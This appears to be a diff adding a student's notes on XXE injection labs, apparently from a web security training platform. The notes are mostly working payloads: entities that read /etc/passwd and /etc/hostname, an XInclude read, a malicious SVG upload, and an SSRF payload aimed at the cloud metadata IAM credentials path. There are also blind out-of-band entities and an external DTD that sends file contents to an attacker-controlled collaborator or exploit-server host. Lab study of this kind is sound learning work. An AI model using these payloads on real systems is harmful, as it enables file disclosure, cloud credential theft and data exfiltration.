@@ -1,0 +1,94 @@
+
+                                        
+                                        XXE INJECTION
+                                        =============
+
+Types of XXE attack
+===================
+1. exploiting XXE to retrives files
+2. exploiting XXE to perform SSRF attacks
+3. Exploiting XXE to perform SSRF attacks
+4. Exploiting blind XXE exfiltrate data out-of-band
+5. Exploiting blind XXE to retrieve data via error message
+
+
+
+
+Lab: Exploiting XXE to retrive files
+==========================================
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<stockCheck><productId>&xxe;</productId></stockCheck>
+
+
+
+Lab: Exploiting XInclude to retrieve files
+==========================================
+1. in the stockId, add
+<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
+
+
+XML based file format
+=====================
+document => docx
+image    => svg 
+
+
+
+
+Lab: Exploiting XXE via image file upload
+=========================================
+
+1. create a svg image file with content
+<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
+
+2. then upload it, and the result will be showed in the image
+
+
+
+
+Exploiting XXE to perform SSRF attacks
+======================================
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]> => invalid-ID: latest
+
+till => latest/meta-data/iam/security-credentials/admin
+
+
+
+
+
+Lab: Blind XXE with out-of-band interaction
+===========================================
+1.  first i inject with simple payload but it has some filter so i have to try out of band technique
+2. so i use burpcollborator like [<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> ]>]
+
+
+
+
+Lab: Blind XXE with out-of-band interaction via XML parameter entities
+======================================================================
+<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> %xxe; ]>
+
+
+
+
+Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD
+===========================================================================
+1. in my exploit server, create a .dtd file with content
+<!ENTITY % file SYSTEM "file:///etc/hostname">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://[burpcollaborator]/?x=%file;'>">
+%eval;
+%exfiltrate;
+
+2. then store the exploit and then copy the exploit file url [https://exploit-0a5c00e3032f5441815516d501c20028.exploit-server.net/exploit.dtd]
+
+3. in the burprepeater
+
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-0a5c00e3032f5441815516d501c20028.exploit-server.net/exploit.dtd"> %xxe;]>
+
+4. Then check the burpcollaborator, BOOM!
+
+
+
+
+
